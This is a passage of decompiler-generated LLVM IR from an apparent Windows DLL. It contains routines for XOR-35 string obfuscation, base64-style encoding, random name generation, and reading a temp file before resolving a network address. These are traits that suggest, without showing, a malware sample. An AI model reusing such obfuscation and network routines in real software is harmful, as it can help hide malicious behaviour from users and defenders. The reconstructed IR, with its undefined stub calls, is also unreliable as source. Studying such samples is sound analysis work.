  %107 = icmp eq i1 %106, false, !insn.addr !4180
  br i1 %107, label %dec_label_pc_10007788, label %dec_label_pc_10007781, !insn.addr !4180

dec_label_pc_10007781:                            ; preds = %dec_label_pc_1000777d
  %108 = add nuw i8 %105, 65, !insn.addr !4181
  %109 = add i32 %71, 3, !insn.addr !4181
  %110 = inttoptr i32 %109 to i8*, !insn.addr !4181
  store i8 %108, i8* %110, align 1, !insn.addr !4181
  br label %dec_label_pc_100077b1, !insn.addr !4182

dec_label_pc_10007788:                            ; preds = %dec_label_pc_1000777d
  %111 = icmp ult i8 %105, 52, !insn.addr !4183
  %112 = icmp eq i1 %111, false, !insn.addr !4184
  br i1 %112, label %dec_label_pc_10007793, label %dec_label_pc_1000778c, !insn.addr !4184

dec_label_pc_1000778c:                            ; preds = %dec_label_pc_10007788
  %113 = add nuw i8 %105, 71, !insn.addr !4185
  %114 = add i32 %71, 3, !insn.addr !4185
  %115 = inttoptr i32 %114 to i8*, !insn.addr !4185
  store i8 %113, i8* %115, align 1, !insn.addr !4185
  br label %dec_label_pc_100077b1, !insn.addr !4186

dec_label_pc_10007793:                            ; preds = %dec_label_pc_10007788
  %116 = icmp ult i8 %105, 62, !insn.addr !4187
  %117 = icmp eq i1 %116, false, !insn.addr !4188
  br i1 %117, label %dec_label_pc_1000779e, label %dec_label_pc_10007797, !insn.addr !4188

dec_label_pc_10007797:                            ; preds = %dec_label_pc_10007793
  %118 = add nsw i8 %105, -4, !insn.addr !4189
  %119 = add i32 %71, 3, !insn.addr !4189
  %120 = inttoptr i32 %119 to i8*, !insn.addr !4189
  store i8 %118, i8* %120, align 1, !insn.addr !4189
  br label %dec_label_pc_100077b1, !insn.addr !4190

dec_label_pc_1000779e:                            ; preds = %dec_label_pc_10007793
  %121 = icmp eq i8 %105, 62, !insn.addr !4187
  %122 = icmp eq i1 %121, false, !insn.addr !4191
  %123 = zext i1 %122 to i8, !insn.addr !4191
  %124 = mul i8 %123, 4, !insn.addr !4192
  %125 = or i8 %124, 43, !insn.addr !4192
  %126 = add i32 %71, 3, !insn.addr !4193
  %127 = inttoptr i32 %126 to i8*, !insn.addr !4193
  store i8 %125, i8* %127, align 1, !insn.addr !4193
  br label %dec_label_pc_100077b1, !insn.addr !4194

dec_label_pc_100077ad:                            ; preds = %dec_label_pc_10007776
  %128 = add i32 %71, 3, !insn.addr !4195
  %129 = inttoptr i32 %128 to i8*, !insn.addr !4195
  store i8 61, i8* %129, align 1, !insn.addr !4195
  br label %dec_label_pc_100077b1, !insn.addr !4195

dec_label_pc_100077b1:                            ; preds = %dec_label_pc_100077ad, %dec_label_pc_1000779e, %dec_label_pc_10007797, %dec_label_pc_1000778c, %dec_label_pc_10007781
  %130 = add i32 %edi.0.reload, 3, !insn.addr !4196
  %131 = add i32 %71, 4, !insn.addr !4197
  %132 = inttoptr i32 %131 to i8*, !insn.addr !4198
  %133 = add i32 %edi.0.reload, 2, !insn.addr !4199
  %134 = icmp slt i32 %133, %stack_var_-16.0.reload, !insn.addr !4200
  store i32 %15, i32* %merge.reg2mem, !insn.addr !4200
  store i8* %132, i8** %stack_var_-8.0.reg2mem, !insn.addr !4200
  store i32 %130, i32* %edi.0.reg2mem, !insn.addr !4200
  br i1 %134, label %dec_label_pc_10007697, label %dec_label_pc_10007659, !insn.addr !4200
}

define i32 @function_100077e0() local_unnamed_addr {
dec_label_pc_100077e0:
  %esi.1.reg2mem = alloca i32, !insn.addr !4201
  %edi.0.reg2mem = alloca i32, !insn.addr !4201
  %esi.0.reg2mem = alloca i32, !insn.addr !4201
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-36 = alloca i32, align 4
  %2 = mul i32 %0, 2
  %3 = add i32 %2, 2, !insn.addr !4202
  store i32 64, i32* %stack_var_-36, align 4, !insn.addr !4203
  %4 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !4203
  %5 = call i32* @LocalAlloc(i32 64, i32 %3), !insn.addr !4204
  %6 = ptrtoint i32* %5 to i32, !insn.addr !4204
  %7 = icmp slt i32 %0, 1
  %.pre = add i32 %4, -4
  %.pre1 = inttoptr i32 %.pre to i32*
  store i32 0, i32* %esi.1.reg2mem, !insn.addr !4205
  br i1 %7, label %dec_label_pc_1000783b, label %dec_label_pc_10007810.preheader, !insn.addr !4205

dec_label_pc_10007810.preheader:                  ; preds = %dec_label_pc_100077e0
  %8 = add i32 %4, -8, !insn.addr !4206
  %9 = inttoptr i32 %8 to i32*, !insn.addr !4206
  %10 = add i32 %4, -12, !insn.addr !4207
  %11 = inttoptr i32 %10 to i32*, !insn.addr !4207
  store i32 0, i32* %esi.0.reg2mem
  store i32 %6, i32* %edi.0.reg2mem
  br label %dec_label_pc_10007810

dec_label_pc_10007810:                            ; preds = %dec_label_pc_10007810, %dec_label_pc_10007810.preheader
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %12 = add i32 %esi.0.reload, %1, !insn.addr !4208
  %13 = inttoptr i32 %12 to i8*, !insn.addr !4208
  %14 = load i8, i8* %13, align 1, !insn.addr !4208
  %15 = udiv i8 %14, 8, !insn.addr !4209
  %16 = mul i8 %14, 32, !insn.addr !4209
  %17 = or i8 %15, %16, !insn.addr !4209
  %18 = xor i8 %17, 35, !insn.addr !4210
  %19 = zext i8 %18 to i32, !insn.addr !4210
  store i8 %18, i8* %13, align 1, !insn.addr !4211
  store i32 %19, i32* %.pre1, align 4, !insn.addr !4212
  store i32 ptrtoint ([5 x i8]* @global_var_100393c4 to i32), i32* %9, align 4, !insn.addr !4206
  store i32 %edi.0.reload, i32* %11, align 4, !insn.addr !4207
  %20 = call i32 @function_100073f0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !4213
  %21 = add nuw nsw i32 %esi.0.reload, 1, !insn.addr !4214
  %22 = add i32 %edi.0.reload, 2, !insn.addr !4215
  %exitcond = icmp eq i32 %21, %0
  store i32 %21, i32* %esi.0.reg2mem, !insn.addr !4216
  store i32 %22, i32* %edi.0.reg2mem, !insn.addr !4216
  store i32 %2, i32* %esi.1.reg2mem, !insn.addr !4216
  br i1 %exitcond, label %dec_label_pc_1000783b, label %dec_label_pc_10007810, !insn.addr !4216

dec_label_pc_1000783b:                            ; preds = %dec_label_pc_10007810, %dec_label_pc_100077e0
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %23 = add i32 %esi.1.reload, %6, !insn.addr !4217
  %24 = inttoptr i32 %23 to i8*, !insn.addr !4217
  store i8 0, i8* %24, align 1, !insn.addr !4217
  %25 = call i32 @function_10007640(), !insn.addr !4218
  store i32 %6, i32* %.pre1, align 4, !insn.addr !4219
  %26 = call i32* @LocalFree(i32* nonnull @1), !insn.addr !4220
  ret i32 %25, !insn.addr !4221
}

define i32 @function_10007860() local_unnamed_addr {
dec_label_pc_10007860:
  %edx.2.reg2mem = alloca i32, !insn.addr !4222
  %edx.1.reg2mem = alloca i32, !insn.addr !4222
  %ecx.2.reg2mem = alloca i8, !insn.addr !4222
  %eax.3.reg2mem = alloca i32, !insn.addr !4222
  %ecx.1.reg2mem = alloca i32, !insn.addr !4222
  %edi.0.reg2mem = alloca i32, !insn.addr !4222
  %esi.0.reg2mem = alloca i32, !insn.addr !4222
  %edx.0.reg2mem = alloca i32, !insn.addr !4222
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-808 = alloca i32, align 4
  %stack_var_-824 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  br label %dec_label_pc_10007880, !insn.addr !4223

dec_label_pc_10007880:                            ; preds = %dec_label_pc_10007880, %dec_label_pc_10007860
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %1 = inttoptr i32 %edx.0.reload to i8*, !insn.addr !4224
  %2 = load i8, i8* %1, align 1, !insn.addr !4224
  %3 = add i32 %edx.0.reload, 1, !insn.addr !4225
  %4 = icmp eq i8 %2, 0, !insn.addr !4226
  %5 = icmp eq i1 %4, false, !insn.addr !4227
  store i32 %3, i32* %edx.0.reg2mem, !insn.addr !4227
  br i1 %5, label %dec_label_pc_10007880, label %dec_label_pc_10007887, !insn.addr !4227

dec_label_pc_10007887:                            ; preds = %dec_label_pc_10007880
  %6 = sub i32 %edx.0.reload, %0, !insn.addr !4228
  %7 = add i32 %6, 1, !insn.addr !4229
  %8 = icmp slt i32 %7, 1
  br i1 %8, label %dec_label_pc_100078cb, label %dec_label_pc_10007893, !insn.addr !4230

dec_label_pc_10007893:                            ; preds = %dec_label_pc_10007887
  %9 = ptrtoint i32* %stack_var_-824 to i32, !insn.addr !4231
  %10 = ptrtoint i32* %stack_var_-808 to i32, !insn.addr !4232
  %11 = add i32 %9, -4, !insn.addr !4233
  %12 = inttoptr i32 %11 to i32*, !insn.addr !4233
  %13 = add i32 %9, -8, !insn.addr !4234
  %14 = inttoptr i32 %13 to i32*, !insn.addr !4234
  %15 = add i32 %9, -12, !insn.addr !4235
  %16 = inttoptr i32 %15 to i32*, !insn.addr !4235
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !4236
  store i32 %10, i32* %edi.0.reg2mem, !insn.addr !4236
  br label %dec_label_pc_100078a0, !insn.addr !4236

dec_label_pc_100078a0:                            ; preds = %dec_label_pc_100078a0, %dec_label_pc_10007893
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %17 = add i32 %esi.0.reload, %0, !insn.addr !4237
  %18 = inttoptr i32 %17 to i8*, !insn.addr !4237
  %19 = load i8, i8* %18, align 1, !insn.addr !4237
  %20 = udiv i8 %19, 8, !insn.addr !4238
  %21 = mul i8 %19, 32, !insn.addr !4238
  %22 = or i8 %20, %21, !insn.addr !4238
  %23 = xor i8 %22, 35, !insn.addr !4239
  %24 = zext i8 %23 to i32, !insn.addr !4239
  store i8 %23, i8* %18, align 1, !insn.addr !4240
  store i32 %24, i32* %12, align 4, !insn.addr !4233
  store i32 ptrtoint ([5 x i8]* @global_var_100393c4 to i32), i32* %14, align 4, !insn.addr !4234
  store i32 %edi.0.reload, i32* %16, align 4, !insn.addr !4235
  %25 = call i32 @function_100073f0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !4241
  %26 = add nuw nsw i32 %esi.0.reload, 1, !insn.addr !4242
  %27 = add i32 %edi.0.reload, 2, !insn.addr !4243
  %exitcond = icmp eq i32 %26, %7
  store i32 %26, i32* %esi.0.reg2mem, !insn.addr !4244
  store i32 %27, i32* %edi.0.reg2mem, !insn.addr !4244
  br i1 %exitcond, label %dec_label_pc_100078cb, label %dec_label_pc_100078a0, !insn.addr !4244

dec_label_pc_100078cb:                            ; preds = %dec_label_pc_100078a0, %dec_label_pc_10007887
  %28 = mul i32 %7, 2, !insn.addr !4245
  %29 = or i32 %28, 1, !insn.addr !4245
  %30 = icmp ult i32 %29, 800, !insn.addr !4246
  %31 = icmp eq i1 %30, false, !insn.addr !4247
  br i1 %31, label %dec_label_pc_10007937, label %dec_label_pc_100078da, !insn.addr !4247

dec_label_pc_100078da:                            ; preds = %dec_label_pc_100078cb
  %32 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !4248
  %33 = ptrtoint i32* %stack_var_-808 to i32, !insn.addr !4249
  %34 = add i32 %32, -804, !insn.addr !4250
  %35 = add i32 %34, %29, !insn.addr !4250
  %36 = inttoptr i32 %35 to i8*, !insn.addr !4250
  store i8 0, i8* %36, align 1, !insn.addr !4250
  store i32 %33, i32* %ecx.1.reg2mem, !insn.addr !4251
  br label %dec_label_pc_100078f0, !insn.addr !4251

dec_label_pc_100078f0:                            ; preds = %dec_label_pc_100078f0, %dec_label_pc_100078da
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %37 = inttoptr i32 %ecx.1.reload to i8*, !insn.addr !4252
  %38 = load i8, i8* %37, align 1, !insn.addr !4252
  %39 = add i32 %ecx.1.reload, 1, !insn.addr !4253
  %40 = icmp eq i8 %38, 0, !insn.addr !4254
  %41 = icmp eq i1 %40, false, !insn.addr !4255
  store i32 %39, i32* %ecx.1.reg2mem, !insn.addr !4255
  br i1 %41, label %dec_label_pc_100078f0, label %dec_label_pc_100078f7, !insn.addr !4255

dec_label_pc_100078f7:                            ; preds = %dec_label_pc_100078f0
  %42 = call i32 @function_10007640(), !insn.addr !4256
  %43 = inttoptr i32 %42 to i8*, !insn.addr !4257
  %44 = load i8, i8* %43, align 1, !insn.addr !4257
  %45 = icmp eq i8 %44, 0, !insn.addr !4257
  store i32 0, i32* %edx.2.reg2mem, !insn.addr !4258
  br i1 %45, label %dec_label_pc_10007923, label %dec_label_pc_10007910, !insn.addr !4258

dec_label_pc_10007910:                            ; preds = %dec_label_pc_100078f7
  %46 = sub i32 %0, %42, !insn.addr !4259
  store i32 %42, i32* %eax.3.reg2mem, !insn.addr !4259
  store i8 %44, i8* %ecx.2.reg2mem, !insn.addr !4259
  store i32 0, i32* %edx.1.reg2mem, !insn.addr !4259
  br label %dec_label_pc_10007916, !insn.addr !4259

dec_label_pc_10007916:                            ; preds = %dec_label_pc_10007916, %dec_label_pc_10007910
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %ecx.2.reload = load i8, i8* %ecx.2.reg2mem
  %eax.3.reload = load i32, i32* %eax.3.reg2mem
  %47 = add i32 %46, %eax.3.reload, !insn.addr !4260
  %48 = inttoptr i32 %47 to i8*, !insn.addr !4260
  store i8 %ecx.2.reload, i8* %48, align 1, !insn.addr !4260
  %49 = add i32 %eax.3.reload, 1, !insn.addr !4261
  %50 = inttoptr i32 %49 to i8*, !insn.addr !4262
  %51 = load i8, i8* %50, align 1, !insn.addr !4262
  %52 = add i32 %edx.1.reload, 1, !insn.addr !4263
  %53 = icmp eq i8 %51, 0, !insn.addr !4264
  %54 = icmp eq i1 %53, false, !insn.addr !4265
  store i32 %49, i32* %eax.3.reg2mem, !insn.addr !4265
  store i8 %51, i8* %ecx.2.reg2mem, !insn.addr !4265
  store i32 %52, i32* %edx.1.reg2mem, !insn.addr !4265
  store i32 %52, i32* %edx.2.reg2mem, !insn.addr !4265
  br i1 %54, label %dec_label_pc_10007916, label %dec_label_pc_10007923, !insn.addr !4265

dec_label_pc_10007923:                            ; preds = %dec_label_pc_10007916, %dec_label_pc_100078f7
  %edx.2.reload = load i32, i32* %edx.2.reg2mem
  %55 = add i32 %edx.2.reload, %0, !insn.addr !4266
  %56 = inttoptr i32 %55 to i8*, !insn.addr !4266
  store i8 0, i8* %56, align 1, !insn.addr !4266
  %57 = call i32 @"@__security_check_cookie@4"(), !insn.addr !4267
  ret i32 %57, !insn.addr !4268

dec_label_pc_10007937:                            ; preds = %dec_label_pc_100078cb
  %58 = call i32 @___report_rangecheckfailure(), !insn.addr !4269
  %59 = call i32 @__asm_int3(), !insn.addr !4270
  %60 = call i32 @__asm_int3(), !insn.addr !4271
  %61 = call i32 @__asm_int3(), !insn.addr !4272
  %62 = call i32 @__asm_int3(), !insn.addr !4273
  ret i32 %62, !insn.addr !4273
}

define i32 @function_10007940() local_unnamed_addr {
dec_label_pc_10007940:
  %esi.1.reg2mem = alloca i32, !insn.addr !4274
  %eax.0.reg2mem = alloca i32, !insn.addr !4274
  %esi.0.reg2mem = alloca i32, !insn.addr !4274
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @_rand(), !insn.addr !4275
  %2 = ashr i32 %1, 31, !insn.addr !4276
  %3 = zext i32 %1 to i64, !insn.addr !4277
  %4 = zext i32 %2 to i64, !insn.addr !4277
  %5 = mul i64 %4, 4294967296, !insn.addr !4277
  %6 = or i64 %5, %3, !insn.addr !4277
  %7 = sdiv i64 %6, 7, !insn.addr !4277
  %8 = trunc i64 %7 to i32, !insn.addr !4277
  %9 = srem i64 %6, 7, !insn.addr !4277
  %10 = trunc i64 %9 to i32, !insn.addr !4277
  %11 = add i32 %10, 3, !insn.addr !4278
  %12 = icmp slt i32 %11, 1
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !4279
  store i32 0, i32* %esi.1.reg2mem, !insn.addr !4279
  br i1 %12, label %dec_label_pc_100079a1, label %dec_label_pc_10007960.preheader, !insn.addr !4279

dec_label_pc_10007960.preheader:                  ; preds = %dec_label_pc_10007940
  %13 = inttoptr i32 %0 to i8*
  store i32 0, i32* %esi.0.reg2mem
  br label %dec_label_pc_10007960

dec_label_pc_10007960:                            ; preds = %dec_label_pc_1000799c, %dec_label_pc_10007960.preheader
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %14 = call i32 @_rand(), !insn.addr !4280
  %15 = ashr i32 %14, 31, !insn.addr !4281
  %16 = zext i32 %14 to i64, !insn.addr !4282
  %17 = zext i32 %15 to i64, !insn.addr !4282
  %18 = mul i64 %17, 4294967296, !insn.addr !4282
  %19 = or i64 %18, %16, !insn.addr !4282
  %20 = srem i64 %19, 26, !insn.addr !4282
  %21 = trunc i64 %20 to i8, !insn.addr !4282
  %22 = add i8 %21, 97, !insn.addr !4283
  %23 = icmp eq i32 %esi.0.reload, 0, !insn.addr !4284
  %24 = icmp eq i1 %23, false, !insn.addr !4285
  br i1 %24, label %dec_label_pc_10007983, label %dec_label_pc_10007974, !insn.addr !4285

dec_label_pc_10007974:                            ; preds = %dec_label_pc_10007960
  %25 = icmp ne i8 %22, 114
  %26 = icmp eq i8 %22, 122, !insn.addr !4286
  %27 = icmp eq i1 %26, false, !insn.addr !4287
  %or.cond = icmp eq i1 %25, %27
  br i1 %or.cond, label %dec_label_pc_1000798d, label %dec_label_pc_1000797e, !insn.addr !4288

dec_label_pc_1000797e:                            ; preds = %dec_label_pc_10007974
  store i8 112, i8* %13, align 1, !insn.addr !4289
  br label %dec_label_pc_1000799c, !insn.addr !4290

dec_label_pc_10007983:                            ; preds = %dec_label_pc_10007960
  switch i8 %21, label %dec_label_pc_1000798d [
    i8 25, label %dec_label_pc_10007992
    i8 17, label %dec_label_pc_10007992
  ]

dec_label_pc_1000798d:                            ; preds = %dec_label_pc_10007983, %dec_label_pc_10007974
  %28 = add i32 %esi.0.reload, %0, !insn.addr !4291
  %29 = inttoptr i32 %28 to i8*, !insn.addr !4291
  store i8 %22, i8* %29, align 1, !insn.addr !4291
  br label %dec_label_pc_1000799c, !insn.addr !4292

dec_label_pc_10007992:                            ; preds = %dec_label_pc_10007983, %dec_label_pc_10007983
  %30 = add i32 %esi.0.reload, %0
  %31 = add i32 %30, -1, !insn.addr !4293
  %32 = inttoptr i32 %31 to i8*, !insn.addr !4293
  %33 = load i8, i8* %32, align 1, !insn.addr !4293
  %34 = icmp eq i8 %33, %22, !insn.addr !4293
  %35 = icmp eq i1 %34, false, !insn.addr !4294
  br i1 %35, label %dec_label_pc_1000799c, label %dec_label_pc_10007998, !insn.addr !4294

dec_label_pc_10007998:                            ; preds = %dec_label_pc_10007992
  %36 = inttoptr i32 %30 to i8*, !insn.addr !4295
  store i8 107, i8* %36, align 1, !insn.addr !4295
  br label %dec_label_pc_1000799c, !insn.addr !4295

dec_label_pc_1000799c:                            ; preds = %dec_label_pc_10007998, %dec_label_pc_10007992, %dec_label_pc_1000798d, %dec_label_pc_1000797e
  %37 = add nuw nsw i32 %esi.0.reload, 1, !insn.addr !4296
  %exitcond = icmp eq i32 %37, %11
  store i32 %37, i32* %esi.0.reg2mem, !insn.addr !4297
  br i1 %exitcond, label %dec_label_pc_100079a1.loopexit, label %dec_label_pc_10007960, !insn.addr !4297

dec_label_pc_100079a1.loopexit:                   ; preds = %dec_label_pc_1000799c
  %38 = sdiv i64 %19, 26, !insn.addr !4282
  %39 = trunc i64 %38 to i32, !insn.addr !4282
  store i32 %39, i32* %eax.0.reg2mem
  store i32 %11, i32* %esi.1.reg2mem
  br label %dec_label_pc_100079a1

dec_label_pc_100079a1:                            ; preds = %dec_label_pc_100079a1.loopexit, %dec_label_pc_10007940
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %40 = add i32 %esi.1.reload, %0, !insn.addr !4298
  %41 = inttoptr i32 %40 to i8*, !insn.addr !4298
  store i8 0, i8* %41, align 1, !insn.addr !4298
  ret i32 %eax.0.reload, !insn.addr !4299
}

define i32 @function_100079b0(i16 %arg1) local_unnamed_addr {
dec_label_pc_100079b0:
  %esp.1.reg2mem = alloca i32, !insn.addr !4300
  %storemerge.reg2mem = alloca i32, !insn.addr !4300
  %eax.1.reg2mem = alloca i32, !insn.addr !4300
  %edx.0.reg2mem = alloca i32, !insn.addr !4300
  %ecx.0.reg2mem = alloca i32, !insn.addr !4300
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !4300
  %0 = sext i16 %arg1 to i128
  %stack_var_-68 = alloca i32, align 4
  %stack_var_1128 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_1136 = alloca i32, align 4
  %stack_var_16 = alloca i8*, align 4
  %stack_var_-20 = alloca i32, align 4
  %1 = call i32 @__chkstk(), !insn.addr !4301
  %2 = load i128, i128* @global_var_10039990, align 4, !insn.addr !4302
  %3 = call i128 @__asm_movaps(i128 %2), !insn.addr !4302
  call void @__asm_movups(i128 %0, i128 %3), !insn.addr !4303
  %4 = call i128 @__asm_xorps(i128 %3, i128 %3), !insn.addr !4304
  %5 = call i32 @__asm_movaps.34(i128 %4), !insn.addr !4305
  %6 = call i32 @__asm_movaps.34(i128 %4), !insn.addr !4306
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_16, align 4, !insn.addr !4307
  %7 = inttoptr i32 %6 to %addrinfo**, !insn.addr !4308
  %8 = call i32 @getaddrinfo(i8* null, i8* inttoptr (i32 1 to i8*), %addrinfo* inttoptr (i32 6 to %addrinfo*), %addrinfo** %7), !insn.addr !4308
  %9 = bitcast i32* %stack_var_1136 to i16*
  %10 = call i32 @GetTempPathW(i32 1000, i16* nonnull %9), !insn.addr !4309
  %11 = ptrtoint i32* %stack_var_-20 to i32, !insn.addr !4310
  store i32 %11, i32* %stack_var_-56, align 4, !insn.addr !4310
  %12 = call i32 @function_10007430(i32* nonnull %stack_var_-20), !insn.addr !4311
  %13 = icmp slt i32 %12, 0, !insn.addr !4312
  store i32* %stack_var_-56, i32** %esp.0.in.reg2mem, !insn.addr !4313
  br i1 %13, label %dec_label_pc_10007a7c, label %dec_label_pc_10007a5e, !insn.addr !4313

dec_label_pc_10007a5e:                            ; preds = %dec_label_pc_100079b0
  %14 = ptrtoint i32* %stack_var_1128 to i32, !insn.addr !4314
  store i32 %14, i32* %stack_var_-68, align 4, !insn.addr !4314
  %15 = bitcast i8** %stack_var_16 to i32*, !insn.addr !4315
  %16 = call i32 @function_10007500(i32* nonnull %stack_var_1128, i32* nonnull %15, i32* nonnull %stack_var_1128), !insn.addr !4315
  store i32* %stack_var_-68, i32** %esp.0.in.reg2mem, !insn.addr !4315
  br label %dec_label_pc_10007a7c, !insn.addr !4315

dec_label_pc_10007a7c:                            ; preds = %dec_label_pc_10007a5e, %dec_label_pc_100079b0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %17 = add i32 %esp.0, 1176, !insn.addr !4316
  %18 = add i32 %esp.0, -4, !insn.addr !4317
  %19 = inttoptr i32 %18 to i32*, !insn.addr !4317
  store i32 0, i32* %19, align 4, !insn.addr !4317
  %20 = add i32 %esp.0, -8, !insn.addr !4318
  %21 = inttoptr i32 %20 to i32*, !insn.addr !4318
  store i32 128, i32* %21, align 4, !insn.addr !4318
  %22 = add i32 %esp.0, -12, !insn.addr !4319
  %23 = inttoptr i32 %22 to i32*, !insn.addr !4319
  store i32 3, i32* %23, align 4, !insn.addr !4319
  %24 = add i32 %esp.0, -16, !insn.addr !4320
  %25 = inttoptr i32 %24 to i32*, !insn.addr !4320
  store i32 0, i32* %25, align 4, !insn.addr !4320
  %26 = add i32 %esp.0, -20, !insn.addr !4321
  %27 = inttoptr i32 %26 to i32*, !insn.addr !4321
  store i32 1, i32* %27, align 4, !insn.addr !4321
  %28 = add i32 %esp.0, -24, !insn.addr !4322
  %29 = inttoptr i32 %28 to i32*, !insn.addr !4322
  store i32 -2147483648, i32* %29, align 4, !insn.addr !4322
  %30 = add i32 %esp.0, -28, !insn.addr !4323
  %31 = inttoptr i32 %30 to i32*, !insn.addr !4323
  store i32 %17, i32* %31, align 4, !insn.addr !4323
  %32 = add i32 %esp.0, 64, !insn.addr !4324
  %33 = inttoptr i32 %32 to i16*, !insn.addr !4324
  store i16 10, i16* %33, align 4, !insn.addr !4324
  %34 = call i32* @CreateFileW(i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !4325
  %35 = add i32 %esp.0, -32, !insn.addr !4326
  %36 = inttoptr i32 %35 to i32*, !insn.addr !4326
  store i32 0, i32* %36, align 4, !insn.addr !4326
  %37 = icmp eq i32* %34, inttoptr (i32 -1 to i32*), !insn.addr !4327
  %38 = add i32 %esp.0, -36
  %39 = inttoptr i32 %38 to i32*
  br i1 %37, label %dec_label_pc_10007b5f, label %dec_label_pc_10007ab2, !insn.addr !4328

dec_label_pc_10007ab2:                            ; preds = %dec_label_pc_10007a7c
  %40 = ptrtoint i32* %34 to i32, !insn.addr !4325
  store i32 %22, i32* %39, align 4, !insn.addr !4329
  %41 = add i32 %esp.0, -40, !insn.addr !4330
  %42 = inttoptr i32 %41 to i32*, !insn.addr !4330
  store i32 2000, i32* %42, align 4, !insn.addr !4330
  %43 = add i32 %esp.0, 3148, !insn.addr !4331
  %44 = add i32 %esp.0, -44, !insn.addr !4332
  %45 = inttoptr i32 %44 to i32*, !insn.addr !4332
  store i32 %43, i32* %45, align 4, !insn.addr !4332
  %46 = add i32 %esp.0, -48, !insn.addr !4333
  %47 = inttoptr i32 %46 to i32*, !insn.addr !4333
  store i32 %40, i32* %47, align 4, !insn.addr !4333
  %48 = call i1 @ReadFile(i32* nonnull @1, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !4334
  %49 = add i32 %esp.0, -52, !insn.addr !4335
  %50 = inttoptr i32 %49 to i32*, !insn.addr !4335
  store i32 %40, i32* %50, align 4, !insn.addr !4335
  %51 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !4336
  %52 = load i32, i32* %31, align 4, !insn.addr !4337
  %53 = add i32 %52, 4, !insn.addr !4338
  %54 = inttoptr i32 %53 to i32*, !insn.addr !4338
  %55 = load i32, i32* %54, align 4, !insn.addr !4338
  %56 = add i32 %esp.0, -56, !insn.addr !4338
  %57 = inttoptr i32 %56 to i32*, !insn.addr !4338
  store i32 %55, i32* %57, align 4, !insn.addr !4338
  %58 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @1 to i32) }), !insn.addr !4339
  %59 = ptrtoint i8* %58 to i32, !insn.addr !4339
  %60 = add i32 %esp.0, -60, !insn.addr !4340
  %61 = inttoptr i32 %60 to i32*, !insn.addr !4340
  store i32 %59, i32* %61, align 4, !insn.addr !4340
  %62 = add i32 %esp.0, 120, !insn.addr !4341
  %63 = add i32 %esp.0, -64, !insn.addr !4342
  %64 = inttoptr i32 %63 to i32*, !insn.addr !4342
  store i32 %62, i32* %64, align 4, !insn.addr !4342
  %65 = call i8* @lstrcpyA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !4343
  %66 = add i32 %esp.0, 112, !insn.addr !4344
  store i32 %66, i32* %ecx.0.reg2mem, !insn.addr !4345
  br label %dec_label_pc_10007b00, !insn.addr !4345

dec_label_pc_10007b00:                            ; preds = %dec_label_pc_10007b00, %dec_label_pc_10007ab2
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %67 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !4346
  %68 = load i8, i8* %67, align 1, !insn.addr !4346
  %69 = add i32 %ecx.0.reload, 1, !insn.addr !4347
  %70 = icmp eq i8 %68, 0, !insn.addr !4348
  %71 = icmp eq i1 %70, false, !insn.addr !4349
  store i32 %69, i32* %ecx.0.reg2mem, !insn.addr !4349
  br i1 %71, label %dec_label_pc_10007b00, label %dec_label_pc_10007b07, !insn.addr !4349

dec_label_pc_10007b07:                            ; preds = %dec_label_pc_10007b00
  %72 = add i32 %esp.0, 113, !insn.addr !4350
  %73 = icmp eq i32 %69, %72, !insn.addr !4351
  store i32 0, i32* %edx.0.reg2mem, !insn.addr !4352
  br i1 %73, label %dec_label_pc_10007b30, label %dec_label_pc_10007b10, !insn.addr !4352

dec_label_pc_10007b10:                            ; preds = %dec_label_pc_10007b07, %dec_label_pc_10007b2a
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %74 = add i32 %edx.0.reload, %66, !insn.addr !4353
  %75 = inttoptr i32 %74 to i8*, !insn.addr !4353
  %76 = load i8, i8* %75, align 1, !insn.addr !4353
  %77 = xor i8 %76, 35, !insn.addr !4353
  store i8 %77, i8* %75, align 1, !insn.addr !4353
  store i32 %66, i32* %eax.1.reg2mem, !insn.addr !4354
  br label %dec_label_pc_10007b23, !insn.addr !4354

dec_label_pc_10007b23:                            ; preds = %dec_label_pc_10007b23, %dec_label_pc_10007b10
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %78 = inttoptr i32 %eax.1.reload to i8*, !insn.addr !4355
